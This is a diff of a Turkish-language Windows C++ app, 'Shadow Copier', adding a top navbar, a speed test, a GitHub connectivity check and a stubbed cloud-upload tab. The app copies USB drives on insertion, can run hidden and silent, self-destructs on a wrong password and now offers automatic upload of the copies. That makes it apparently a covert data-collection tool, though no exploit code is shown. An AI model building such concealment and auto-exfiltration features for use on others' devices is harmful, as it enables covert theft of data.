@@ -50,6 +50,19 @@ namespace fs = std::filesystem;
 #define IDB_NAV_HOME 1001
 #define IDB_NAV_SETTINGS 1002
 #define IDB_NAV_INFO 1003
+#define IDB_NAV_LONELITH 1004
+
+// New Lonelith controls
+#define IDB_LONELITH_UPLOAD 1005
+#define IDB_LONELITH_REFRESH 1006
+#define IDB_SPEED_TEST 1007
+#define IDC_EDIT_AUTH_KEY 1008
+#define IDB_SAVE_AUTH_KEY 1009
+#define IDC_CHECK_AUTO_UPLOAD 1010
+#define IDC_LONELITH_FILE_LIST 1011
+
+// Progress bar
+#define IDC_PROGRESS_BAR 1012
 
 // Kontroller
 #define IDB_SELECT_FOLDER 200
@@ -74,6 +87,17 @@ const COLORREF CLR_TEXT_MAIN = RGB(33, 37, 41);
 const COLORREF CLR_ACCENT = RGB(13, 110, 253);
 const COLORREF CLR_BORDER = RGB(222, 226, 230);
 const COLORREF CLR_DANGER = RGB(220, 53, 69);
+const COLORREF CLR_SUCCESS = RGB(25, 135, 84);
+
+// Layout constants
+const int NAVBAR_HEIGHT = 60;
+const int FOOTER_HEIGHT = 30;
+const int PROGRESS_BAR_HEIGHT = 4;
+const int TAB_COUNT = 4;
+
+// Network test constants
+const wchar_t* SPEED_TEST_URL = L"https://speed.cloudflare.com/__down?bytes=1000000";
+const DWORD SPEED_TEST_SIZE = 1000000;  // 1MB
 
 // --- GLOBAL DEĞİŞKENLER ---
 HINSTANCE g_hInst = NULL;
@@ -97,18 +121,31 @@ HICON g_hIconNoInternet = NULL;
 HICON g_hIconConnected = NULL;
 HICON g_hIconDefault = NULL;
 
+// Animation and progress globals
+int g_animationOffset = 0;
+int g_progressValue = 0;
+bool g_isMarquee = true;
+bool g_autoUpload = false;
+std::wstring g_currentSpeed = L"";
+std::wstring g_lonelithServerHealth = L"Unknown";
+std::wstring g_githubConnHealth = L"Unknown";
+
 // UI Kaynakları
 HFONT g_hFontTitle, g_hFontSubtitle, g_hFontNormal, g_hFontSmall, g_hFontMono;
 HBRUSH g_hBrushMainBg, g_hBrushSidebar;
 
 // Global Kontrol Handle'ları
-HWND g_hNavBtnHome, g_hNavBtnSettings, g_hNavBtnInfo;
+HWND g_hNavBtnHome, g_hNavBtnSettings, g_hNavBtnInfo, g_hNavBtnLonelith;
 HWND g_hPathDisplay, g_hStatusText;
 HWND g_hCheckStartup, g_hCheckSilent, g_hEditDefaultPath, g_hCheckStartTray, g_hCheckGoodbye;
 HWND g_hEditPassword;
 HWND g_hInfoText;
+HWND g_hProgressBar;
+HWND g_hEditAuthKey, g_hCheckAutoUpload;
+HWND g_hLonelithFileList;
+HWND g_hSpeedTestResult;
 
-std::vector<HWND> g_tabControls[3];
+std::vector<HWND> g_tabControls[TAB_COUNT];
 
 int g_currentTab = 0;
 const wchar_t* CLASS_NAME = L"ShadowCopierApp";
@@ -134,7 +171,7 @@ void CheckExistingDrives();
 void RemoveTrayIcon();
 void ShowContextMenu(HWND hWnd);
 std::wstring GetDefaultPath();
-void PaintSidebarButton(LPDRAWITEMSTRUCT pDIS);
+void PaintNavButton(LPDRAWITEMSTRUCT pDIS);
 std::wstring GetSystemInfo();
 std::wstring FormatBytes(uintmax_t bytes);
 bool IsSilentMode();
@@ -156,12 +193,21 @@ std::wstring DecryptString(const std::wstring& encryptedText);
 void SaveAuthKey(const std::wstring& authKey);
 std::wstring LoadAuthKey();
 bool UploadFileToLonelith(const std::wstring& filePath);
+std::vector<std::wstring> GetFilesFromLonelith();
+bool ShowFileOnLonelith(const std::wstring& fileId);
+void TestInternetSpeed();
+void CheckGitHubConnection();
+void CheckLonelithHealth();
+void UpdateProgressBar(int value, bool marquee);
+void AnimatePasswordBox(HWND hEdit, bool shake);
+void SetupPageTransition(int fromTab, int toTab);
 
 // Yardımcı: UI Oluşturma
 HWND CreateCtrl(int tabIndex, LPCWSTR lpClassName, LPCWSTR lpWindowName, DWORD dwStyle, int x, int y, int nWidth, int nHeight, HWND hParent, HMENU hMenu) {
-    int adjustedX = x + 200;
-    HWND hCtrl = CreateWindowW(lpClassName, lpWindowName, dwStyle, adjustedX, y, nWidth, nHeight, hParent, hMenu, g_hInst, NULL);
-    if (tabIndex >= 0 && tabIndex < 3) {
+    // No sidebar adjustment needed - top navbar layout
+    int adjustedY = y + NAVBAR_HEIGHT;
+    HWND hCtrl = CreateWindowW(lpClassName, lpWindowName, dwStyle, x, adjustedY, nWidth, nHeight, hParent, hMenu, g_hInst, NULL);
+    if (tabIndex >= 0 && tabIndex < TAB_COUNT) {
         g_tabControls[tabIndex].push_back(hCtrl);
     }
     return hCtrl;
@@ -409,6 +455,10 @@ LRESULT CALLBACK LoginWndProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lPa
             else {
                 g_wrongAttempts++;
                 int remaining = MAX_ATTEMPTS - g_wrongAttempts;
+                
+                // Animate the password box with shake effect
+                AnimatePasswordBox(g_hLoginEditCtrl, true);
+                
                 std::wstring msg = L"Hatalı Parola!\nKalan Hakkınız: " + std::to_wstring(remaining);
                 MessageBoxW(hWnd, msg.c_str(), L"Erişim Reddedildi", MB_ICONERROR);
                 SetWindowTextW(g_hLoginEditCtrl, L"");
@@ -679,6 +729,210 @@ bool UploadFileToLonelith(const std::wstring& filePath) {
     return false;
 }
 
+// Get list of files from Lonelith server
+std::vector<std::wstring> GetFilesFromLonelith() {
+    std::vector<std::wstring> files;
+    
+    if (!g_hasInternet) {
+        LogMessage(L"⚠️ İnternet bağlantısı yok.");
+        return files;
+    }
+    
+    if (g_lonelithAuthKey.empty()) {
+        LogMessage(L"⚠️ Lonelith auth key ayarlanmamış.");
+        return files;
+    }
+    
+    // TODO: Implement actual GET request to Lonelith
+    // Placeholder: Would make GET request to /files endpoint
+    LogMessage(L"ℹ️ Lonelith dosya listesi - API detayları için repo erişimi gerekli.");
+    
+    return files;
+}
+
+// Show/open file from Lonelith server
+bool ShowFileOnLonelith(const std::wstring& fileId) {
+    if (!g_hasInternet) {
+        LogMessage(L"⚠️ İnternet bağlantısı yok.");
+        return false;
+    }
+    
+    if (g_lonelithAuthKey.empty()) {
+        LogMessage(L"⚠️ Lonelith auth key ayarlanmamış.");
+        return false;
+    }
+    
+    // TODO: Implement actual show/display file functionality
+    LogMessage(L"ℹ️ Lonelith dosya görüntüleme - API detayları için repo erişimi gerekli.");
+    
+    return false;
+}
+
+// Test internet speed
+void TestInternetSpeed() {
+    if (!g_hasInternet) {
+        g_currentSpeed = L"İnternet bağlantısı yok";
+        LogMessage(L"⚠️ İnternet bağlantısı yok, hız testi yapılamıyor.");
+        return;
+    }
+    
+    LogMessage(L"🚀 İnternet hız testi başlatılıyor...");
+    UpdateProgressBar(0, false);
+    
+    // Simple speed test: Download a test file and measure time
+    HINTERNET hInternet = InternetOpenW(L"ShadowCopy", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
+    if (hInternet) {
+        DWORD startTime = GetTickCount();
+        
+        // Download test file
+        HINTERNET hUrl = InternetOpenUrlW(hInternet, 
+            SPEED_TEST_URL, 
+            NULL, 0, 
+            INTERNET_FLAG_NO_CACHE_WRITE | INTERNET_FLAG_RELOAD, 0);
+        
+        if (hUrl) {
+            BYTE buffer[8192];
+            DWORD bytesRead = 0;
+            DWORD totalBytes = 0;
+            
+            while (InternetReadFile(hUrl, buffer, sizeof(buffer), &bytesRead) && bytesRead > 0) {
+                totalBytes += bytesRead;
+                UpdateProgressBar((totalBytes * 100) / SPEED_TEST_SIZE, false);
+            }
+            
+            DWORD elapsedMs = GetTickCount() - startTime;
+            if (elapsedMs > 0) {
+                double speedMbps = (totalBytes * 8.0 / 1000000.0) / (elapsedMs / 1000.0);
+                wchar_t speedBuf[128];
+                swprintf_s(speedBuf, L"%.2f Mbps", speedMbps);
+                g_currentSpeed = speedBuf;
+                
+                LogMessage(L"✅ İnternet hızı: " + g_currentSpeed);
+                if (g_hSpeedTestResult) {
+                    SetWindowTextW(g_hSpeedTestResult, g_currentSpeed.c_str());
+                }
+            }
+            
+            InternetCloseHandle(hUrl);
+        } else {
+            g_currentSpeed = L"Test başarısız";
+            LogMessage(L"⚠️ Hız testi başarısız oldu.");
+        }
+        
+        InternetCloseHandle(hInternet);
+    }
+    
+    UpdateProgressBar(0, true);  // Return to marquee
+}
+
+// Check GitHub connection.txt file
+void CheckGitHubConnection() {
+    HINTERNET hInternet = InternetOpenW(L"ShadowCopy", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
+    if (hInternet) {
+        HINTERNET hUrl = InternetOpenUrlW(hInternet, 
+            L"https://raw.githubusercontent.com/prescionx/ConnectionTest/refs/heads/main/connection.txt", 
+            NULL, 0, 
+            INTERNET_FLAG_NO_CACHE_WRITE | INTERNET_FLAG_SECURE, 0);
+        
+        if (hUrl) {
+            g_githubConnHealth = L"✅ Connected";
+            LogMessage(L"✅ GitHub bağlantısı başarılı.");
+            InternetCloseHandle(hUrl);
+        } else {
+            g_githubConnHealth = L"❌ Failed";
+            LogMessage(L"⚠️ GitHub bağlantısı başarısız.");
+        }
+        
+        InternetCloseHandle(hInternet);
+    } else {
+        g_githubConnHealth = L"❌ No Internet";
+    }
+}
+
+// Check Lonelith server health
+void CheckLonelithHealth() {
+    if (!g_hasInternet) {
+        g_lonelithServerHealth = L"❌ No Internet";
+        return;
+    }
+    
+    // TODO: Implement actual health check when API is available
+    // Would check /health endpoint
+    g_lonelithServerHealth = L"⚠️ API Not Available";
+    LogMessage(L"ℹ️ Lonelith health check - API detayları için repo erişimi gerekli.");
+}
+
+// Update progress bar
+void UpdateProgressBar(int value, bool marquee) {
+    g_progressValue = value;
+    g_isMarquee = marquee;
+    
+    if (g_hProgressBar) {
+        if (marquee) {
+            SetWindowLongPtr(g_hProgressBar, GWL_STYLE, 
+                GetWindowLongPtr(g_hProgressBar, GWL_STYLE) | PBS_MARQUEE);
+            SendMessage(g_hProgressBar, PBM_SETMARQUEE, TRUE, 50);
+        } else {
+            SetWindowLongPtr(g_hProgressBar, GWL_STYLE, 
+                GetWindowLongPtr(g_hProgressBar, GWL_STYLE) & ~PBS_MARQUEE);
+            SendMessage(g_hProgressBar, PBM_SETMARQUEE, FALSE, 0);
+            SendMessage(g_hProgressBar, PBM_SETPOS, value, 0);
+        }
+    }
+}
+
+// Animate password box (shake on error)
+void AnimatePasswordBox(HWND hEdit, bool shake) {
+    if (!hEdit) return;
+    
+    if (shake) {
+        RECT rc;
+        GetWindowRect(hEdit, &rc);
+        POINT pt = {rc.left, rc.top};
+        ScreenToClient(GetParent(hEdit), &pt);
+        
+        // Note: Using Sleep() for shake animation is intentional
+        // This blocks the UI briefly (300ms total) to provide immediate visual feedback
+        // Alternative: Use SetTimer for non-blocking animation if needed
+        
+        // Shake animation
+        for (int i = 0; i < 3; i++) {
+            SetWindowPos(hEdit, NULL, pt.x + 5, pt.y, 0, 0, SWP_NOSIZE | SWP_NOZORDER);
+            Sleep(50);
+            SetWindowPos(hEdit, NULL, pt.x - 5, pt.y, 0, 0, SWP_NOSIZE | SWP_NOZORDER);
+            Sleep(50);
+        }
+        SetWindowPos(hEdit, NULL, pt.x, pt.y, 0, 0, SWP_NOSIZE | SWP_NOZORDER);
+        
+        // Flash red background
+        HWND hParent = GetParent(hEdit);
+        HDC hdc = GetDC(hEdit);
+        RECT editRc;
+        GetClientRect(hEdit, &editRc);
+        
+        for (int i = 0; i < 2; i++) {
+            HBRUSH redBrush = CreateSolidBrush(RGB(255, 200, 200));
+            FrameRect(hdc, &editRc, redBrush);
+            DeleteObject(redBrush);
+            Sleep(100);
+            InvalidateRect(hEdit, NULL, TRUE);
+            Sleep(100);
+        }
+        
+        ReleaseDC(hEdit, hdc);
+    }
+}
+
+// Setup page transition animation
+void SetupPageTransition(int fromTab, int toTab) {
+    // Simple fade transition by hiding old and showing new
+    // More complex transitions could use SetLayeredWindowAttributes
+    
+    // For now, just do instant switch with future potential for animation
+    // This can be enhanced with actual slide animations if needed
+    g_animationOffset = 0;
+}
+
 // --- MAIN ---
 int APIENTRY wWinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance, _In_ LPWSTR lpCmdLine, _In_ int nCmdShow)
 {
@@ -711,8 +965,14 @@ int APIENTRY wWinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance
     wcex.hCursor = LoadCursor(nullptr, IDC_ARROW);
     wcex.hbrBackground = g_hBrushMainBg;
     wcex.lpszClassName = CLASS_NAME;
-    wcex.hIcon = LoadIcon(hInstance, IDI_APPLICATION);
-    wcex.hIconSm = LoadIcon(hInstance, IDI_APPLICATION);
+    
+    // Load application icon for titlebar
+    HICON hAppIcon = LoadIcon(hInstance, MAKEINTRESOURCE(IDI_APPLICATION));
+    if (!hAppIcon) {
+        hAppIcon = LoadIcon(hInstance, L"ShadowCopy.ico");
+    }
+    wcex.hIcon = hAppIcon;
+    wcex.hIconSm = hAppIcon;
     RegisterClassExW(&wcex);
 
     g_hMainWindow = CreateWindowExW(0, CLASS_NAME, L"Shadow Copier",
@@ -721,6 +981,12 @@ int APIENTRY wWinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance
         nullptr, nullptr, hInstance, nullptr);
 
     if (!g_hMainWindow) return FALSE;
+    
+    // Set window icon explicitly
+    if (hAppIcon) {
+        SendMessage(g_hMainWindow, WM_SETICON, ICON_BIG, (LPARAM)hAppIcon);
+        SendMessage(g_hMainWindow, WM_SETICON, ICON_SMALL, (LPARAM)hAppIcon);
+    }
 
     BOOL dark = FALSE;
     DwmSetWindowAttribute(g_hMainWindow, DWMWA_USE_IMMERSIVE_DARK_MODE, &dark, sizeof(dark));
@@ -748,6 +1014,16 @@ int APIENTRY wWinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance
     // Log initial internet status
     if (g_hasInternet) {
         LogMessage(L"✅ İnternet bağlantısı aktif.");
+        
+        // Run initial health checks
+        CheckGitHubConnection();
+        CheckLonelithHealth();
+        
+        // Run speed test on first connection
+        std::thread([]() {
+            std::this_thread::sleep_for(std::chrono::seconds(2));
+            TestInternetSpeed();
+        }).detach();
     } else {
         LogMessage(L"⚠️ İnternet bağlantısı yok.");
     }
@@ -832,69 +1108,124 @@ void SetModernStyle(HWND hControl) {
 // --- UI OLUŞTURMA ---
 void CreateUI(HWND hWnd)
 {
-    int btnY = 60; int btnH = 50;
-    g_hNavBtnHome = CreateWindowW(L"BUTTON", L"🏠  Ana Sayfa", WS_CHILD | WS_VISIBLE | BS_OWNERDRAW, 0, btnY, 200, btnH, hWnd, (HMENU)IDB_NAV_HOME, g_hInst, NULL);
-    g_hNavBtnSettings = CreateWindowW(L"BUTTON", L"⚙  Ayarlar", WS_CHILD | WS_VISIBLE | BS_OWNERDRAW, 0, btnY + btnH, 200, btnH, hWnd, (HMENU)IDB_NAV_SETTINGS, g_hInst, NULL);
-    g_hNavBtnInfo = CreateWindowW(L"BUTTON", L"ℹ️  Sistem Bilgisi", WS_CHILD | WS_VISIBLE | BS_OWNERDRAW, 0, btnY + (btnH * 2), 200, btnH, hWnd, (HMENU)IDB_NAV_INFO, g_hInst, NULL);
+    // Create top navigation bar (horizontal)
+    int btnW = 180; int btnH = 40; int btnX = 20;
+    g_hNavBtnHome = CreateWindowW(L"BUTTON", L"🏠 Ana Sayfa", WS_CHILD | WS_VISIBLE | BS_OWNERDRAW, btnX, 10, btnW, btnH, hWnd, (HMENU)IDB_NAV_HOME, g_hInst, NULL);
+    btnX += btnW + 10;
+    g_hNavBtnSettings = CreateWindowW(L"BUTTON", L"⚙ Ayarlar", WS_CHILD | WS_VISIBLE | BS_OWNERDRAW, btnX, 10, btnW, btnH, hWnd, (HMENU)IDB_NAV_SETTINGS, g_hInst, NULL);
+    btnX += btnW + 10;
+    g_hNavBtnInfo = CreateWindowW(L"BUTTON", L"ℹ️ Sistem Bilgisi", WS_CHILD | WS_VISIBLE | BS_OWNERDRAW, btnX, 10, btnW, btnH, hWnd, (HMENU)IDB_NAV_INFO, g_hInst, NULL);
+    btnX += btnW + 10;
+    g_hNavBtnLonelith = CreateWindowW(L"BUTTON", L"☁️ Lonelith", WS_CHILD | WS_VISIBLE | BS_OWNERDRAW, btnX, 10, btnW, btnH, hWnd, (HMENU)IDB_NAV_LONELITH, g_hInst, NULL);
+
+    // Create progress bar in footer
+    RECT clientRect;
+    GetClientRect(hWnd, &clientRect);
+    int footerY = clientRect.bottom - FOOTER_HEIGHT;
+    g_hProgressBar = CreateWindowW(PROGRESS_CLASSW, NULL, 
+        WS_CHILD | WS_VISIBLE | PBS_MARQUEE, 
+        0, footerY, clientRect.right, PROGRESS_BAR_HEIGHT, 
+        hWnd, (HMENU)IDC_PROGRESS_BAR, g_hInst, NULL);
+    SendMessage(g_hProgressBar, PBM_SETMARQUEE, TRUE, 50);
 
     // TAB 0: HOME
-    CreateLabel(0, hWnd, L"Shadow Copier", 40, 30, 400, 40, g_hFontTitle);
-    CreateLabel(0, hWnd, L"USB algılandığında şifreli yedekleme başlatılır.", 40, 75, 550, 25, g_hFontNormal);
+    CreateLabel(0, hWnd, L"Shadow Copier", 40, 10, 400, 40, g_hFontTitle);
+    CreateLabel(0, hWnd, L"USB algılandığında şifreli yedekleme başlatılır.", 40, 55, 550, 25, g_hFontNormal);
 
-    CreateLabel(0, hWnd, L"📂 Hedef Klasör:", 40, 120, 200, 25, g_hFontSubtitle);
-    g_hPathDisplay = CreateCtrl(0, L"EDIT", g_targetPath.c_str(), WS_CHILD | WS_VISIBLE | ES_AUTOHSCROLL | ES_READONLY | WS_BORDER, 40, 150, 450, 30, hWnd, (HMENU)IDC_EDIT_PATH);
+    CreateLabel(0, hWnd, L"📂 Hedef Klasör:", 40, 100, 200, 25, g_hFontSubtitle);
+    g_hPathDisplay = CreateCtrl(0, L"EDIT", g_targetPath.c_str(), WS_CHILD | WS_VISIBLE | ES_AUTOHSCROLL | ES_READONLY | WS_BORDER, 40, 130, 450, 30, hWnd, (HMENU)IDC_EDIT_PATH);
     SendMessage(g_hPathDisplay, WM_SETFONT, (WPARAM)g_hFontNormal, TRUE);
 
-    HWND hBtnChange = CreateCtrl(0, L"BUTTON", L"Değiştir", WS_CHILD | WS_VISIBLE | BS_PUSHBUTTON, 500, 150, 100, 30, hWnd, (HMENU)IDB_SELECT_FOLDER);
+    HWND hBtnChange = CreateCtrl(0, L"BUTTON", L"Değiştir", WS_CHILD | WS_VISIBLE | BS_PUSHBUTTON, 500, 130, 100, 30, hWnd, (HMENU)IDB_SELECT_FOLDER);
     SetModernStyle(hBtnChange);
 
-    CreateLabel(0, hWnd, L"📝 İşlem Günlüğü:", 40, 200, 200, 25, g_hFontSubtitle);
-    g_hStatusText = CreateCtrl(0, L"EDIT", L"Sistem hazır. USB bekleniyor...\r\n", WS_CHILD | WS_VISIBLE | WS_VSCROLL | ES_MULTILINE | ES_AUTOVSCROLL | ES_READONLY | WS_BORDER, 40, 230, 600, 300, hWnd, NULL);
+    CreateLabel(0, hWnd, L"📝 İşlem Günlüğü:", 40, 180, 200, 25, g_hFontSubtitle);
+    g_hStatusText = CreateCtrl(0, L"EDIT", L"Sistem hazır. USB bekleniyor...\r\n", WS_CHILD | WS_VISIBLE | WS_VSCROLL | ES_MULTILINE | ES_AUTOVSCROLL | ES_READONLY | WS_BORDER, 40, 210, 800, 310, hWnd, NULL);
     SendMessage(g_hStatusText, WM_SETFONT, (WPARAM)g_hFontSmall, TRUE);
 
     // TAB 1: SETTINGS
-    CreateLabel(1, hWnd, L"Ayarlar", 40, 30, 200, 40, g_hFontTitle);
-    CreateLabel(1, hWnd, L"Başlangıç Seçenekleri", 40, 80, 300, 25, g_hFontSubtitle);
-    g_hCheckStartup = CreateCtrl(1, L"BUTTON", L"Windows ile başlat", WS_CHILD | WS_VISIBLE | BS_AUTOCHECKBOX, 40, 110, 300, 30, hWnd, (HMENU)IDC_CHECK_STARTUP);
+    CreateLabel(1, hWnd, L"Ayarlar", 40, 10, 200, 40, g_hFontTitle);
+    CreateLabel(1, hWnd, L"Başlangıç Seçenekleri", 40, 60, 300, 25, g_hFontSubtitle);
+    g_hCheckStartup = CreateCtrl(1, L"BUTTON", L"Windows ile başlat", WS_CHILD | WS_VISIBLE | BS_AUTOCHECKBOX, 40, 90, 300, 30, hWnd, (HMENU)IDC_CHECK_STARTUP);
     SetModernStyle(g_hCheckStartup);
     if (g_startWithWindows) SendMessage(g_hCheckStartup, BM_SETCHECK, BST_CHECKED, 0);
 
-    g_hCheckStartTray = CreateCtrl(1, L"BUTTON", L"Program açılışta gizli başlasın (Tepsi)", WS_CHILD | WS_VISIBLE | BS_AUTOCHECKBOX, 40, 140, 350, 30, hWnd, (HMENU)IDC_CHECK_START_TRAY);
+    g_hCheckStartTray = CreateCtrl(1, L"BUTTON", L"Program açılışta gizli başlasın (Tepsi)", WS_CHILD | WS_VISIBLE | BS_AUTOCHECKBOX, 40, 120, 350, 30, hWnd, (HMENU)IDC_CHECK_START_TRAY);
     SetModernStyle(g_hCheckStartTray);
     if (g_startInTray) SendMessage(g_hCheckStartTray, BM_SETCHECK, BST_CHECKED, 0);
 
-    g_hCheckSilent = CreateCtrl(1, L"BUTTON", L"Sessiz Mod (Bildirim gönderme)", WS_CHILD | WS_VISIBLE | BS_AUTOCHECKBOX, 40, 170, 300, 30, hWnd, (HMENU)IDC_CHECK_SILENT);
+    g_hCheckSilent = CreateCtrl(1, L"BUTTON", L"Sessiz Mod (Bildirim gönderme)", WS_CHILD | WS_VISIBLE | BS_AUTOCHECKBOX, 40, 150, 300, 30, hWnd, (HMENU)IDC_CHECK_SILENT);
     SetModernStyle(g_hCheckSilent);
     if (IsSilentMode()) SendMessage(g_hCheckSilent, BM_SETCHECK, BST_CHECKED, 0);
 
-    g_hCheckGoodbye = CreateCtrl(1, L"BUTTON", L"Kendini imha ederken 'elveda.txt' bırak", WS_CHILD | WS_VISIBLE | BS_AUTOCHECKBOX, 40, 200, 400, 30, hWnd, (HMENU)IDC_CHECK_GOODBYE);
+    g_hCheckGoodbye = CreateCtrl(1, L"BUTTON", L"Kendini imha ederken 'elveda.txt' bırak", WS_CHILD | WS_VISIBLE | BS_AUTOCHECKBOX, 40, 180, 400, 30, hWnd, (HMENU)IDC_CHECK_GOODBYE);
     SetModernStyle(g_hCheckGoodbye);
     if (g_leaveGoodbyeNote) SendMessage(g_hCheckGoodbye, BM_SETCHECK, BST_CHECKED, 0);
 
     int secX = 350;
-    CreateLabel(1, hWnd, L"Güvenlik", 40 + secX, 80, 200, 25, g_hFontSubtitle);
-    CreateLabel(1, hWnd, L"Erişim Parolası:", 40 + secX, 110, 150, 20, g_hFontNormal);
-    g_hEditPassword = CreateCtrl(1, L"EDIT", g_appPassword.c_str(), WS_CHILD | WS_VISIBLE | WS_BORDER | ES_AUTOHSCROLL, 40 + secX, 135, 180, 30, hWnd, (HMENU)IDC_EDIT_PASSWORD);
+    CreateLabel(1, hWnd, L"Güvenlik", 40 + secX, 60, 200, 25, g_hFontSubtitle);
+    CreateLabel(1, hWnd, L"Erişim Parolası:", 40 + secX, 90, 150, 20, g_hFontNormal);
+    g_hEditPassword = CreateCtrl(1, L"EDIT", g_appPassword.c_str(), WS_CHILD | WS_VISIBLE | WS_BORDER | ES_AUTOHSCROLL, 40 + secX, 115, 180, 30, hWnd, (HMENU)IDC_EDIT_PASSWORD);
     SendMessage(g_hEditPassword, WM_SETFONT, (WPARAM)g_hFontNormal, TRUE);
-    CreateLabel(1, hWnd, L"(Hatalı girişte imha tetiklenir)", 40 + secX, 170, 220, 20, g_hFontSmall);
+    CreateLabel(1, hWnd, L"(Hatalı girişte imha tetiklenir)", 40 + secX, 150, 220, 20, g_hFontSmall);
 
-    CreateLabel(1, hWnd, L"Varsayılan Yedekleme Yolu:", 40, 240, 300, 25, g_hFontSubtitle);
-    g_hEditDefaultPath = CreateCtrl(1, L"EDIT", g_targetPath.c_str(), WS_CHILD | WS_VISIBLE | ES_AUTOHSCROLL | ES_READONLY | WS_BORDER, 40, 270, 450, 30, hWnd, (HMENU)IDC_EDIT_PATH);
+    CreateLabel(1, hWnd, L"Varsayılan Yedekleme Yolu:", 40, 220, 300, 25, g_hFontSubtitle);
+    g_hEditDefaultPath = CreateCtrl(1, L"EDIT", g_targetPath.c_str(), WS_CHILD | WS_VISIBLE | ES_AUTOHSCROLL | ES_READONLY | WS_BORDER, 40, 250, 450, 30, hWnd, (HMENU)IDC_EDIT_PATH);
     SendMessage(g_hEditDefaultPath, WM_SETFONT, (WPARAM)g_hFontNormal, TRUE);
 
-    HWND hBtnSave = CreateCtrl(1, L"BUTTON", L"💾  Ayarları Kaydet", WS_CHILD | WS_VISIBLE | BS_PUSHBUTTON, 40, 320, 180, 40, hWnd, (HMENU)IDB_SAVE_SETTINGS);
+    HWND hBtnSave = CreateCtrl(1, L"BUTTON", L"💾  Ayarları Kaydet", WS_CHILD | WS_VISIBLE | BS_PUSHBUTTON, 40, 300, 180, 40, hWnd, (HMENU)IDB_SAVE_SETTINGS);
     SetModernStyle(hBtnSave);
 
-    CreateLabel(1, hWnd, L"Tehlikeli Bölge", 40, 390, 200, 25, g_hFontSubtitle);
-    HWND hBtnReset = CreateCtrl(1, L"BUTTON", L"⚠️ Uygulamayı Sıfırla (Temizle)", WS_CHILD | WS_VISIBLE | BS_PUSHBUTTON, 40, 420, 250, 35, hWnd, (HMENU)IDB_RESET_APP);
+    CreateLabel(1, hWnd, L"Tehlikeli Bölge", 40, 370, 200, 25, g_hFontSubtitle);
+    HWND hBtnReset = CreateCtrl(1, L"BUTTON", L"⚠️ Uygulamayı Sıfırla (Temizle)", WS_CHILD | WS_VISIBLE | BS_PUSHBUTTON, 40, 400, 250, 35, hWnd, (HMENU)IDB_RESET_APP);
     SendMessage(hBtnReset, WM_SETFONT, (WPARAM)g_hFontNormal, TRUE);
-    HWND hBtnUninstall = CreateCtrl(1, L"BUTTON", L"☢️ KALDIR VE YOK ET (UNINSTALL)", WS_CHILD | WS_VISIBLE | BS_PUSHBUTTON, 310, 420, 280, 35, hWnd, (HMENU)IDB_UNINSTALL_APP);
+    HWND hBtnUninstall = CreateCtrl(1, L"BUTTON", L"☢️ KALDIR VE YOK ET (UNINSTALL)", WS_CHILD | WS_VISIBLE | BS_PUSHBUTTON, 310, 400, 280, 35, hWnd, (HMENU)IDB_UNINSTALL_APP);
     SendMessage(hBtnUninstall, WM_SETFONT, (WPARAM)g_hFontNormal, TRUE);
 
     // TAB 2: INFO
-    CreateLabel(2, hWnd, L"Donanım Bilgisi", 40, 30, 300, 40, g_hFontTitle);
-    g_hInfoText = CreateCtrl(2, L"STATIC", L"Yükleniyor...", WS_CHILD | WS_VISIBLE, 40, 90, 620, 450, hWnd, NULL);
+    CreateLabel(2, hWnd, L"Donanım Bilgisi", 40, 10, 300, 40, g_hFontTitle);
+    g_hInfoText = CreateCtrl(2, L"STATIC", L"Yükleniyor...", WS_CHILD | WS_VISIBLE, 40, 70, 800, 450, hWnd, NULL);
     SendMessage(g_hInfoText, WM_SETFONT, (WPARAM)g_hFontMono, TRUE);
+    
+    // TAB 3: LONELITH
+    CreateLabel(3, hWnd, L"Lonelith Bulut Yönetimi", 40, 10, 400, 40, g_hFontTitle);
+    
+    CreateLabel(3, hWnd, L"Auth Key:", 40, 60, 150, 20, g_hFontNormal);
+    g_hEditAuthKey = CreateCtrl(3, L"EDIT", g_lonelithAuthKey.c_str(), WS_CHILD | WS_VISIBLE | WS_BORDER | ES_AUTOHSCROLL | ES_PASSWORD, 40, 85, 350, 30, hWnd, (HMENU)IDC_EDIT_AUTH_KEY);
+    SendMessage(g_hEditAuthKey, WM_SETFONT, (WPARAM)g_hFontNormal, TRUE);
+    
+    HWND hBtnSaveKey = CreateCtrl(3, L"BUTTON", L"💾 Kaydet", WS_CHILD | WS_VISIBLE | BS_PUSHBUTTON, 400, 85, 100, 30, hWnd, (HMENU)IDB_SAVE_AUTH_KEY);
+    SetModernStyle(hBtnSaveKey);
+    
+    g_hCheckAutoUpload = CreateCtrl(3, L"BUTTON", L"İnternet bağlantısı olduğunda otomatik yükle", WS_CHILD | WS_VISIBLE | BS_AUTOCHECKBOX, 40, 125, 400, 30, hWnd, (HMENU)IDC_CHECK_AUTO_UPLOAD);
+    SetModernStyle(g_hCheckAutoUpload);
+    if (g_autoUpload) SendMessage(g_hCheckAutoUpload, BM_SETCHECK, BST_CHECKED, 0);
+    
+    CreateLabel(3, hWnd, L"Bağlantı Durumu:", 40, 165, 200, 25, g_hFontSubtitle);
+    CreateLabel(3, hWnd, L"GitHub:", 40, 195, 100, 20, g_hFontNormal);
+    HWND hGitHubStatus = CreateCtrl(3, L"STATIC", g_githubConnHealth.c_str(), WS_CHILD | WS_VISIBLE, 150, 195, 300, 20, hWnd, NULL);
+    SendMessage(hGitHubStatus, WM_SETFONT, (WPARAM)g_hFontNormal, TRUE);
+    
+    CreateLabel(3, hWnd, L"Lonelith Server:", 40, 220, 100, 20, g_hFontNormal);
+    HWND hLonelithStatus = CreateCtrl(3, L"STATIC", g_lonelithServerHealth.c_str(), WS_CHILD | WS_VISIBLE, 150, 220, 300, 20, hWnd, NULL);
+    SendMessage(hLonelithStatus, WM_SETFONT, (WPARAM)g_hFontNormal, TRUE);
+    
+    CreateLabel(3, hWnd, L"İnternet Hızı:", 40, 245, 100, 20, g_hFontNormal);
+    g_hSpeedTestResult = CreateCtrl(3, L"STATIC", g_currentSpeed.c_str(), WS_CHILD | WS_VISIBLE, 150, 245, 200, 20, hWnd, NULL);
+    SendMessage(g_hSpeedTestResult, WM_SETFONT, (WPARAM)g_hFontNormal, TRUE);
+    
